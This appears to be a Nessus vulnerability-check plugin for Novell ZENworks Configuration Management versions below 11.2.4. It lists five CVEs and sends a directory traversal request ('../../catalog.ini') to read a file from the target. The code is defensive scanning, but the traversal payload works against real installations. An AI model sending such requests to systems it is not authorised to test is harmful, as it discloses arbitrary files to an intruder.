#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(70726);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/09/24 21:17:13 $");

  script_cve_id("CVE-2013-1084", "CVE-2013-6344", "CVE-2013-6345", "CVE-2013-6346", "CVE-2013-6347");
  script_bugtraq_id(63433, 63499, 63498, 63497, 63495);
  script_osvdb_id(99198, 99269, 99270, 99268, 99271);

  script_name(english:"Novell ZENworks Configuration Management < 11.2.4 Multiple Vulnerabilities");
  script_summary(english:"Tries to read source of catalog.ini via directory traversal");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a configuration management
application affected by multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of Novell ZENworks Configuration Management installed on
the remote host can be tricked into disclosing any file readable by the
Novell ZENworks umaninv service, and as such it is affected by multiple
vulnerabilities :

  - A directory traversal vulnerability exists that allows
    any file readable by the Novell ZENworks umaniv service
    to be disclosed. (CVE-2013-1084)

  - An unspecified flaw in the ZENworks Control Center page
    that can result in an application exception with an
    unspecified impact. (CVE-2013-6345)

  - An unspecified cross site request forgery flaw in the
    ZENworks Control Center page. (CVE-2013-6346)

  - An unspecified cross frame scripting flaw in the
    ZENworks Control Center page. (CVE-2013-6344)

  - An unspecified session fixation flaw in the ZENworks
    Control Center page. (CVE-2013-6347)");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-13-258/");
  script_set_attribute(attribute:"see_also", value:"http://www.novell.com/support/kb/doc.php?id=7012760");
  script_set_attribute(attribute:"see_also", value:"http://www.novell.com/support/kb/doc.php?id=7012027");
  script_set_attribute(attribute:"solution", value:"Update to Novell ZENworks 11.2.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/10/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/10/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/11/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:zenworks_configuration_management");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("novell_zenworks_control_center_detect.nasl");
  script_require_keys("www/zenworks_control_center");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:443);

install = get_install_from_kb(
  appname      : "zenworks_control_center",
  port         : port,
  exit_on_fail : TRUE
);

path = "/zenworks-unmaninv/?action=GetFile&Filename=../../catalog.ini&Type=4&Platform=11&Lang=0";
flag = "[Catalog]";

r = http_send_recv3(method:"GET", item:path, port:port, exit_on_fail:TRUE);
status = r[0];
body = r[2];

if ("200 OK" >< status && flag >< body)
{
  report = string(
    "\n  Nessus was able to read the contents of a file using the",
    "\n  following request:\n\n",
    path,"\n");

  if (report_verbosity > 0)
  {
    if ( ! defined_func("security_report_with_attachments") )
      security_hole(port:port, extra:report);
    else
    {
      attachments = make_list();
      attachments[0] = make_array();
      attachments[0]["type"] = "text/plain";
      attachments[0]["name"] = "config.ini";
      attachments[0]["value"] = body;
      security_report_with_attachments(level:3, port:port, extra:report, attachments:attachments);
    }
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Novell ZENworks Configuration Manager", port);
